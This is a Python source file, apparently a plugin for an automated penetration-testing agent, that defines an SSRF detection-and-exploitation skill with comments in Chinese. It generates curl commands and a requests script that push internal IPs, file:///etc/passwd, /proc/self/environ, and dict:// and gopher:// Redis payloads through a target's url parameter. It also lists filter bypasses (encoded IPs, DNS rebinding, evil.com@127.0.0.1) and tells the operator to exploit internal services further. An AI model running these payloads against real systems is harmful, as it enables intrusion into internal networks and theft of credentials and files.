from typing import Dict, Any
from ..base import Skill, SkillCategory, SkillResult
from ..decorators import register_skill

@register_skill
class SSRFSkill(Skill):
    """
    SSRF（服务器端请求伪造）检测与利用技能
    """

    def __init__(self):
        super().__init__()
        self.id = "web_ssrf"
        self.name = "SSRF检测与利用"
        self.category = SkillCategory.WEB
        self.description = "检测SSRF漏洞并尝试利用访问内网资源"
        self.prerequisites = ["target_url"]
        self.tools_required = ["execute_shell", "execute_python"]
        self.difficulty = "medium"

    def execute(self, context: Dict[str, Any], executor: Any) -> SkillResult:
        """
        执行SSRF检测与利用

        步骤：
        1. 识别可能的SSRF参数（url, link, src, target等）
        2. 测试内网IP访问
        3. 测试协议支持（http, https, file, gopher, dict等）
        4. 绕过过滤（IP编码、域名重定向等）
        5. 利用SSRF读取文件
        6. 利用SSRF探测内网
        """
        # 检查前置条件
        ok, msg = self.check_prerequisites(context)
        if not ok:
            return SkillResult(success=False, message=msg)

        target_url = context["target_url"]
        commands = []
        findings = []

        # 1. 基础SSRF测试 - 访问外部服务器
        findings.append("步骤1: 测试基础SSRF（访问外部服务器）")
        cmd1 = f"curl -s \"{target_url}?url=http://example.com\""
        commands.append(cmd1)

        # 2. 测试内网访问
        findings.append("步骤2: 测试内网IP访问")
        internal_ips = [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://192.168.1.1",
            "http://10.0.0.1",
            "http://172.16.0.1"
        ]
        for ip in internal_ips[:3]:  # 只列举前3个
            cmd = f"curl -s \"{target_url}?url={ip}\""
            commands.append(cmd)

        # 3. 测试协议支持
        findings.append("步骤3: 测试支持的协议")
        protocols = [
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/info",
            "gopher://127.0.0.1:6379/_INFO",
            "ftp://127.0.0.1",
        ]
        for proto in protocols:
            cmd = f"curl -s \"{target_url}?url={proto}\""
            commands.append(cmd)

        # 4. IP编码绕过
        findings.append("步骤4: IP编码绕过测试")
        # 127.0.0.1的各种编码
        encoded_ips = [
            "http://2130706433",  # 十进制
            "http://0x7f000001",  # 十六进制
            "http://0177.0.0.1",  # 八进制
            "http://127.1",       # 省略0
            "http://[::1]",       # IPv6
        ]
        for ip in encoded_ips:
            cmd = f"curl -s \"{target_url}?url={ip}\""
            commands.append(cmd)

        # 5. 利用SSRF读取文件
        findings.append("步骤5: 尝试读取敏感文件")
        sensitive_files = [
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///proc/self/environ",
            "file:///var/www/html/index.php",
        ]
        for file_path in sensitive_files:
            cmd = f"curl -s \"{target_url}?url={file_path}\""
            commands.append(cmd)

        # 6. 探测内网端口
        findings.append("步骤6: 探测内网常见端口")
        common_ports = [22, 80, 443, 3306, 6379, 8080, 9000]
        for port in common_ports[:3]:  # 只列举前3个
            cmd = f"curl -s \"{target_url}?url=http://127.0.0.1:{port}\""
            commands.append(cmd)

        # 7. DNS重绑定绕过
        findings.append("步骤7: DNS重绑定绕过")
        cmd_dns = f"curl -s \"{target_url}?url=http://sudo.cc\""  # 指向127.0.0.1的域名
        commands.append(cmd_dns)

        # 8. 302跳转绕过
        findings.append("步骤8: 302跳转绕过")

        # Python脚本 - SSRF利用工具
        ssrf_script = '''
import urllib.parse
import requests

def test_ssrf(target_url, payload_url):
    """测试SSRF漏洞"""
    try:
        # 构造请求
        full_url = f"{target_url}?url={urllib.parse.quote(payload_url)}"
        response = requests.get(full_url, timeout=5)

        print(f"[+] 测试: {payload_url}")
        print(f"状态码: {response.status_code}")
        print(f"响应长度: {len(response.text)}")

        # 检测特征
        if "root:" in response.text:
            print("[!] 可能读取到/etc/passwd")
        if "mysql" in response.text.lower():
            print("[!] 可能访问到MySQL")
        if "redis" in response.text.lower():
            print("[!] 可能访问到Redis")

        return response.text[:200]
    except Exception as e:
        print(f"[-] 错误: {e}")
        return None

# 测试内网访问
target = "TARGET_URL_HERE"
payloads = [
    "http://127.0.0.1",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info"
]

for payload in payloads:
    test_ssrf(target, payload)
'''
        commands.append(ssrf_script)

        # 构建执行建议
        message = f"""SSRF检测与利用技能已准备就绪

目标: {target_url}

SSRF攻击流程：
1. 识别SSRF参数（url, link, src, target, redirect等）
2. 测试外部访问（验证SSRF存在）
3. 测试内网访问（127.0.0.1, localhost, 内网IP）
4. 测试协议支持（file, dict, gopher, ftp等）
5. 绕过过滤（IP编码、DNS重绑定、302跳转）
6. 读取敏感文件（/etc/passwd, 配置文件等）
7. 探测内网服务（端口扫描）
8. 攻击内网服务（Redis, MySQL等）

常见绕过技巧：
- IP编码: 十进制(2130706433)、十六进制(0x7f000001)、八进制(0177.0.0.1)
- 域名绕过: 使用指向127.0.0.1的域名（如sudo.cc）
- 302跳转: 自建服务器302跳转到内网
- DNS重绑定: 第一次解析外网IP，第二次解析内网IP
- 协议绕过: file://, dict://, gopher://等
- @符号绕过: http://evil.com@127.0.0.1
- 短地址绕过: 使用短链接服务

内网常见服务：
- Redis (6379): 可能未授权访问
- MySQL (3306): 可能弱口令
- Memcached (11211): 可能未授权
- FastCGI (9000): 可能RCE
- Docker API (2375): 可能容器逃逸

关键命令（前5条）：
{chr(10).join(f'  {i+1}. {cmd}' for i, cmd in enumerate(commands[:5]))}
... 共{len(commands)}条命令

请安全专家逐步执行，根据响应判断SSRF类型并深入利用。
"""

        return SkillResult(
            success=True,
            message=message,
            data={
                "target": target_url,
                "attack_vectors": ["internal_ip", "file_protocol", "port_scan", "service_attack"],
                "bypass_techniques": ["ip_encoding", "dns_rebinding", "302_redirect", "protocol_bypass"],
                "internal_services": ["redis", "mysql", "memcached", "fastcgi", "docker"]
            },
            commands=commands,
            findings=findings
        )
